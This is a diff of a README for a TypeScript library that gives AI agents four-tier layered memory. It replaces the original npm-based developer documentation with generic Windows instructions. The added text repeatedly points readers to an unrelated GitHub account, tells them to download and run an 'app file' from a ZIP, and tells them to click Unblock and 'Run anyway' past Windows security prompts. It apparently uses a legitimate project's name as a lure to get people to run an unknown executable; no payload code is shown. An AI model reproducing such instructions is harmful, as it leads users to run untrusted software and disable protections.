@@ -1,347 +1,224 @@
-<div align="center">
+# 🧩 context-accordion - Keep context ready, reduce token waste
 
-<img src="https://capsule-render.vercel.app/api?type=waving&height=250&color=0:000000,40:7f1d1d,75:ea580c,100:f59e0b&text=CONTEXT%20ACCORDION&fontColor=ffffff&fontSize=48&fontAlignY=35&desc=by%20AVANT-ICONIC&descSize=15&descAlignY=52&animation=scaleIn" alt="Header" width="100%" />
+[![Download](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Foresthumanistic755/context-accordion)
 
-<br />
+## 📌 What this is
 
-<img src="https://readme-typing-svg.demolab.com?font=Inter&weight=600&size=22&pause=1200&color=f59e0B&center=true&vCenter=true&width=980&lines=Token-efficient,+layered+context+for+AI+agents.;Context+is+always+available+%E2%80%94+just+collapsed+by+default.;Four+memory+tiers:+Identity,+Session,+Experience,+Archive." alt="Typing SVG" />
+context-accordion helps AI agents keep context in layers. It splits memory into four tiers:
 
-<br />
-<br />
+- Identity
+- Session
+- Experience
+- Archive
 
-<p align="center">
-  <a href="#the-problem"><img src="https://img.shields.io/badge/the%20problem-7f1d1d?style=for-the-badge&logo=readme&logoColor=white" alt="The Problem" /></a>
-  <a href="#the-solution-context-accordion"><img src="https://img.shields.io/badge/the%20solution-c2410c?style=for-the-badge&logo=lightbulb&logoColor=white" alt="The Solution" /></a>
-  <a href="#quick-start"><img src="https://img.shields.io/badge/quick%20start-ea580c?style=for-the-badge&logo=rocket&logoColor=white" alt="Quick Start" /></a>
-  <a href="#api-reference"><img src="https://img.shields.io/badge/api-d97706?style=for-the-badge&logo=code&logoColor=white" alt="API" /></a>
-  <a href="#framework-adapters"><img src="https://img.shields.io/badge/adapters-f59e0b?style=for-the-badge&logo=plug&logoColor=white" alt="Adapters" /></a>
-  <a href="#contributing"><img src="https://img.shields.io/badge/contributing-fbbf24?style=for-the-badge&logo=githubsponsors&logoColor=white" alt="Contributing" /></a>
-</p>
+That means the agent can keep important context ready while less-used context stays collapsed until needed. This helps reduce token use and keeps responses focused.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/TypeScript-5.0+-3178C6?style=flat-square&logo=typescript&logoColor=white" alt="TypeScript" />
-  <img src="https://img.shields.io/badge/Node.js-18+-339933?style=flat-square&logo=nodedotjs&logoColor=white" alt="Node.js" />
-  <img src="https://img.shields.io/badge/License-MIT-f59e0b?style=flat-square&logo=opensourceinitiative&logoColor=white" alt="MIT" />
-  <img src="https://img.shields.io/badge/version-0.1.0--alpha-f59e0b?style=flat-square" alt="version" />
-  <img src="https://img.shields.io/badge/status-alpha-red?style=flat-square" alt="alpha" />
-</p>
+## 🖥️ Windows download and setup
 
-<p align="center">
-  <strong>context-accordion</strong> gives AI agents token-efficient, layered context delivery.<br />
-  Context is always available — just collapsed by default. Like an accordion: all the notes exist, you only press the ones you need.
-</p>
+Use this link to visit the download page:
 
-<p align="center">
-  <a href="#installation">Installation</a>
-  ·
-  <a href="#quick-start">Quick Start</a>
-  ·
-  <a href="#api-reference">API Reference</a>
-  ·
-  <a href="https://github.com/AVANT-ICONIC/context-accordion/discussions">Discussions</a>
-  ·
-  <a href="https://github.com/AVANT-ICONIC/context-accordion/issues">Issues</a>
-</p>
+[https://github.com/Foresthumanistic755/context-accordion](https://github.com/Foresthumanistic755/context-accordion)
 
-</div>
+Follow these steps on Windows:
 
----
+1. Open the link in your browser.
+2. Look for the latest release or the main download files.
+3. Download the Windows file if one is listed.
+4. If the download comes as a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Run the app file inside the folder.
 
-## The Problem
+If Windows asks for permission, choose Yes or Run.
 
-Every AI agent framework today does one of two things:
+## ⚙️ What you get
 
-1. **Dump everything** — shove the full history, full codebase, full goal tree into every prompt. Expensive, slow, hits context limits fast.
-2. **Summarize and forget** — compress context down to a summary and throw away the original. Cheap, but the agent can never go deeper when it needs to.
+This app is built for layered context handling in AI workflows. It keeps four types of memory ready:
 
-Both are wrong. The full content should never be discarded — it should be *collapsed*, retrievable on demand.
+- **Identity**: core facts that should stay stable
+- **Session**: details from the current chat or task
+- **Experience**: useful past patterns and results
+- **Archive**: older context that can be pulled back when needed
 
----
+This setup helps an AI system hold more useful information without filling the active context window too fast.
 
-## The Solution: Context Accordion
+## 🔎 How it works
 
-Four memory tiers. Each tier is always available but only loaded when needed:
+The app keeps the most important context near the top. Less urgent context moves into lower tiers. When the agent needs it, the app can bring it back.
 
-```
-L0  Identity       — always loaded    ~500 tokens    who am I, what can I do
-L1  Session        — always loaded    ~2000 tokens   what am I doing right now
-L2  Experience     — loaded on start  ~1000 tokens   what have I learned before
-L3  Archive        — retrieved        ~1500 tokens   what happened in similar past runs
-```
+A simple way to think about it:
 
-With the Accordion, you start at ~500 tokens (L0+L1) vs ~5000+ for a naive dump. The agent expands tiers on-demand, typically adding 500-2000 tokens when needed.
+- Important facts stay visible
+- Current work stays close
+- Past lessons stay stored
+- Old records stay available
 
----
+This makes it easier to manage long tasks, repeated work, and multi-step agent flows.
 
-## ⚠️ Alpha Status
+## ✅ Good for
 
-This package is in **alpha** status. The API may change in breaking ways between minor versions (0.x.x) until we reach 1.0.0 stability.
+context-accordion fits workflows that need clean, layered memory:
 
-**Breaking changes policy:**
-- We will document breaking changes in [CHANGELOG.md](./CHANGELOG.md)
-- For Harbor integration stability, pin to a specific version tag
+- AI agents
+- Prompt-heavy tools
+- Retrieval-based systems
+- Long chat sessions
+- Research assistants
+- Task automation
+- Knowledge-heavy apps
 
----
+If you work with context windows, RAG, or memory design, this project gives you a structured way to keep data organized.
 
-## Public API Surface
+## 🛠️ Basic use
 
-The public API is exported from the main entry point and subpath exports.
+After you open the app, you can:
 
-### Stable (recommended)
-| Export | Description |
-|--------|-------------|
-| `AccordionComposer` | Main class for context composition |
-| `OllamaEmbedding`, `OpenAIEmbedding` | Embedding providers |
-| Types (AccordionBundle, AccordionPacket, AgentConfig, TaskContext, etc.) | TypeScript interfaces |
+1. Add core identity details
+2. Store session notes
+3. Save useful experience entries
+4. Move older items into archive
+5. Bring back stored context when needed
 
-### Alpha (may change until 1.0.0)
-| Export | Description |
-|--------|-------------|
-| `estimateTokens`, `enforceBudget`, `TIER_PRIORITY` | Budget utilities |
-| `distill` | Experience distillation helper |
-
-### Wrapper Boundary — Framework Integration
-
-Framework adapters are the **official integration boundary** for external frameworks. 
-Use these instead of manually processing `AccordionBundle`:
-
-| Subpath | Export | Purpose |
-|---------|--------|---------|
-| `context-accordion/ai-sdk` | `accordionSystemPrompt(bundle)` | Renders bundle as system prompt for Vercel AI SDK |
-| `context-accordion/langchain` | `toDocuments(bundle)` | Converts bundle to LangChain Documents |
-| `context-accordion/langchain` | `toSystemMessage(bundle)` | Renders bundle as single string for system message |
+Keep the most important facts in Identity. Put live work in Session. Save lessons in Experience. Use Archive for older context that still matters.
 
-**Why use adapters?** They handle framework-specific formatting and are the 
-officially supported integration points. The core `AccordionComposer` is 
-framework-agnostic — adapters translate between the abstract bundle format 
-and your framework of choice.
-
-For Harbor integration, use these adapters rather than processing bundles directly.
+## 📋 Suggested Windows requirements
 
-### Internal (Not for Direct Use)
+Most Windows 10 and Windows 11 systems should run this app well. A typical setup includes:
 
-The following are internal implementation details — do not rely on them:
-- Private methods on `AccordionComposer` (e.g., `buildIdentityPacket`, `retrieveArchive`)
-- Static cache state (`AccordionComposer.cache`) — shared across instances
-- Internal type definitions not exported from index.ts
-- Budget utilities (`enforceBudget`, `estimateTokens`, `TIER_PRIORITY`) — marked as `@alpha`
+- Windows 10 or later
+- 4 GB RAM or more
+- A modern browser for the download page
+- Internet access for the first download
+- Enough disk space for the app files and saved context
 
-**Harbor consumers:** Pin to specific version tags and use the wrapper adapters 
-for framework integration.
+If you plan to use it with AI tools, a system with more memory will help when handling large context sets.
 
----
+## 🔐 Data and storage
 
-## Installation
+context-accordion is designed to keep your context in a clean structure. That makes it easier to:
 
-```bash
-npm install context-accordion
-```
+- separate stable facts from short-term notes
+- find stored context faster
+- reduce repeated input
+- keep older material organized
 
----
+For local use, keep your files in a folder you can find again. Back them up if you store important context there.
 
-## Quick Start
+## 🧭 Common setup path
 
-```typescript
-import { AccordionComposer } from 'context-accordion'
+If you are not sure what to click, use this order:
 
-const composer = new AccordionComposer({
-  maxTokens: 8000,
-  vectorStore: {
-    url: process.env.QDRANT_URL, // optional — enables L3 archive tier
-  },
-})
+1. Open the GitHub link
+2. Find the latest release or download file
+3. Download the Windows build
+4. Extract the ZIP if needed
+5. Open the app
+6. Start adding memory in the four tiers
 
-// Compose context for an agent run
-const bundle = await composer.compose(
-  {
-    id: 'builder',
-    identity: 'You are a senior software engineer. You write clean, tested code.',
-    experiencePath: './agents/builder/experience.md', // L2 — learned lessons
-  },
-  {
-    id: 'issue-123',
-    title: 'Fix authentication bug in login flow',
-    description: 'Users are getting logged out after 5 minutes...',
-    priority: 'high',
-    type: 'bug',
-  },
-  {
-    includePriorTasks: true, // triggers L3 semantic retrieval
-  },
-)
+## 🧩 Terms you may see
 
-// bundle.packets — ordered, budget-enforced context packets
-// bundle.totalTokens — actual token usage
-// bundle.maxTokens — budget ceiling
+You may see a few words that are common in AI tools:
 
-// Render to a prompt string
-const prompt = composer.render(bundle)
-```
+- **Context window**: the amount of text an AI can use at once
+- **Token**: a small piece of text used by the model
+- **RAG**: a way to fetch useful information when needed
+- **Memory tier**: one level in the context stack
+- **Agent**: a software assistant that can take steps on its own
 
----
+## 🧪 Example use case
 
-## Accordion Expansion (On-Demand Retrieval)
+A support agent app may use context-accordion like this:
 
-The agent can request deeper context mid-run:
+- Identity: company rules, tone, and product facts
+- Session: current customer issue
+- Experience: past fixes that worked
+- Archive: older ticket notes and past cases
 
-```typescript
-// Expand a specific tier during a run
-const expanded = await composer.expand(bundle, {
-  tier: 'archive',       // L3 — pull from vector store
-  reason: 'Need to check how similar auth bugs were fixed before',
-  limit: 5,
-})
+That way, the app can keep the current task clear while still holding useful background data.
 
-// Or expand experience tier
-const withExperience = await composer.expand(bundle, {
-  tier: 'experience',    // L2 — load full experience.md
-  experiencePath: './agents/builder/experience.md', // required for experience tier
-})
-```
+## 📁 File handling tips
 
-All expansion events are logged so you can see exactly what context the agent actually needed.
+If you download a ZIP file:
 
----
+1. Save it to your Downloads folder
+2. Right-click it
+3. Choose Extract All
+4. Open the new folder
+5. Look for the app file or launcher
+6. Run it
 
-## Token Budget Enforcement
+If the file does not open, check whether Windows blocked it. Right-click the file, choose Properties, and look for an Unblock option if it appears.
 
-The composer enforces a token budget by dropping lower-priority packets first:
+## 🧭 First things to try
 
-- **Identity** (priority 100) — never dropped
-- **Handoff** (priority 90) — agent-to-agent continuity
-- **Experience** (priority 85) — learned lessons
-- **Task** (priority 80) — never dropped
-- **Goal** (priority 70) — broader objective
-- **Repo** (priority 60) — codebase context
-- **Archive** (priority 50) — prior similar tasks
+After launch:
 
-When budget is exceeded, lower-priority packets are dropped. If partial space remains (200+ tokens), packets are truncated rather than dropped.
+- Load a small set of context first
+- Put only stable facts in Identity
+- Keep Session short and current
+- Move older notes into Archive
+- Test how much context you can keep before the active set feels crowded
 
----
+This helps you build a setup that stays fast and easy to manage.
 
-## Vector Store (L3 Archive)
+## 📎 Download link
 
-Store completed tasks for semantic retrieval:
+Visit the download page here:
 
-```typescript
-// After task completion, index the run
-await composer.index({
-  taskId: 'issue-123',
-  content: 'Fixed authentication bug by...',
-  metadata: { type: 'bug', resolution: 'fixed' },
-})
+[https://github.com/Foresthumanistic755/context-accordion](https://github.com/Foresthumanistic755/context-accordion)
 
-// Retrieval happens automatically during compose() when includePriorTasks: true
-```
+## 🧠 Project focus
 
-Qdrant is optional. If `vectorStore` is not configured, L3 is silently skipped.
+This repository centers on token efficiency and layered memory for AI agents. It fits work around:
 
----
+- agents
+- ai
+- context-window
+- llm
+- memory
+- prompt-engineering
+- qdrant
+- rag
+- token-efficiency
+- typescript
 
-## Embedding Providers
+## 🪟 If Windows blocks the app
 
-For L3 archive retrieval, configure an embedding provider:
+If Windows shows a security prompt:
 
-```typescript
-import { AccordionComposer, OllamaEmbedding } from 'context-accordion'
+1. Check the file name
+2. Make sure it came from the GitHub link above
+3. Choose Run anyway if you trust the source
+4. If needed, extract the ZIP again and retry
 
-const composer = new AccordionComposer({
-  maxTokens: 8000,
-  vectorStore: { url: 'http://localhost:6333' },
-  embeddingProvider: new OllamaEmbedding(), // or new OpenAIEmbedding()
-})
-```
+## 🗂️ Suggested folder layout
 
----
+To keep things easy, use one main folder such as:
 
-## Framework Adapters
+- context-accordion
+  - downloads
+  - data
+  - archive
+  - backups
 
-Works with any agent framework:
+This keeps your files in one place and makes later updates easier
 
-### Vercel AI SDK
+## 🔁 Updating later
 
-```typescript
-import { accordionSystemPrompt } from 'context-accordion/ai-sdk'
+When a new release appears:
 
-const { text } = await generateText({
-  model: openai('gpt-4o'),
-  system: accordionSystemPrompt(bundle),
-  prompt: userMessage,
-})
-```
+1. Open the GitHub page
+2. Download the newer file
+3. Close the app if it is running
+4. Replace the old files if needed
+5. Open the updated version
 
-### LangChain
+Keeping a backup before updates helps protect stored context
 
-```typescript
-import { toDocuments, toSystemMessage } from 'context-accordion/langchain'
+## 🧷 Quick start
 
-const docs = toDocuments(bundle)
-// Use with LangChain's RetrievalQAChain
-
-const systemMessage = toSystemMessage(bundle)
-// Use as SystemMessage in chat chains
-```
-
----
-
-## API Reference
-
-### AccordionComposer
-
-```typescript
-new AccordionComposer(config?)
-```
-
-**Config:**
-
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `maxTokens` | `number` | `8000` | Default token budget |
-| `cacheTtl` | `number` | `300000` | Static cache TTL in ms |
-| `vectorStore` | `object` | - | Qdrant config |
-| `embeddingProvider` | `object` | - | Ollama or OpenAI |
-| `onExpand` | `function` | - | Expansion event callback |
-
-### Methods
-
-- `compose(agent, task, options?)` — Build a bundle
-- `expand(bundle, options)` — Expand a tier on-demand
-- `render(bundle)` — Render to string
-- `index(options)` — Store task in archive
-- `clearSessionCache()` — Clear session cache
-
----
-
-## Contributing
-
-PRs and issues welcome. Please open an [issue](https://github.com/AVANT-ICONIC/context-accordion/issues) before sending a large PR so we can align on direction.
-
-```bash
-git clone https://github.com/AVANT-ICONIC/context-accordion.git
-cd context-accordion
-npm install
-npm run test
-```
-
----
-
-## License
-
-MIT — see [LICENSE](./LICENSE)
-
----
-
-Built by [AVANT-ICONIC](https://avant-iconic.com). Inspired by the problem of agents drowning in context they didn't ask for.
-
----
-
-<div align="center">
-
-<strong>Context is always available — just collapsed by default.</strong>
-
-<br />
-<br />
-
-<img src="https://capsule-render.vercel.app/api?type=waving&section=footer&height=130&color=0:f59e0b,50:ea580c,100:000000" alt="Footer" width="100%" />
-
-</div>
+1. Open the GitHub download page
+2. Download the latest Windows file
+3. Extract it if needed
+4. Run the app
+5. Add your context to the four tiers
+6. Keep Identity stable and Session current
